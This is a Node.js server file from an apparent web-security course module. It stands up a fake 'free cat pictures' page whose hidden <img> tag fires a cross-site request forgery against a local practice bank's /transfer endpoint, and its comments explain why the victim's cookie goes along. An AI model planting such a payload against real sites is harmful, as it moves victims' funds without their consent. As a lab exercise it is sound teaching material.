/*
 * server.js (the "attacker site")
 *
 * Module 09: CSRF via GET.
 *
 * A completely unrelated-looking page ("free cat pictures") running on
 * a DIFFERENT port (8001) than the bank (8000) -- standing in for a
 * different website entirely, since a real attacker's CSRF page lives
 * on a domain you've never heard of, not on the bank's own site.
 *
 * The only thing this page does that matters is embed a hidden <img>
 * tag pointing at the bank's /transfer endpoint. When your browser loads
 * THIS page, it also fires that <img> tag's request to localhost:8000 --
 * and because cookies are sent based on the TARGET host (localhost:8000),
 * not the page that triggered the request (localhost:8001), your bank
 * session cookie rides along automatically. See DECISIONS.md #2.
 *
 * Introduced in: Module 09. No previous module's equivalent -- this is
 * the first "attacker's own site" file in the course, rather than a
 * vulnerable target.
 * Prerequisite concepts: Module 04 (Idempotency & Safety) for the hidden
 * <img> technique itself, which this module reuses on purpose.
 */

'use strict';

const http = require('http');

const PORT = 8001;

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Free Cat Pictures</title></head>
<body style="font-family:sans-serif;max-width:640px;margin:40px auto;">
  <h1>100% Legitimate Free Cat Pictures</h1>
  <p>Nothing suspicious here. Definitely just cats.</p>
  <!-- This is the entire attack. One hidden image tag, pointed at a
       completely different origin (localhost:8000). Your browser fires
       this GET request the instant this page loads -- no click needed --
       and attaches whatever cookies belong to localhost:8000, because
       that's the TARGET of the request, regardless of which page
       (localhost:8001, this one) triggered it. -->
  <img src="http://localhost:8000/transfer?to=attacker&amount=100" style="display:none" alt="">
</body></html>`);
});

server.listen(PORT, () => {
  console.log(`Module 09 ATTACKER SITE up on http://localhost:${PORT}`);
  console.log('Visit the bank at :8000 FIRST, then visit this page, then check the bank balance again.\n');
});
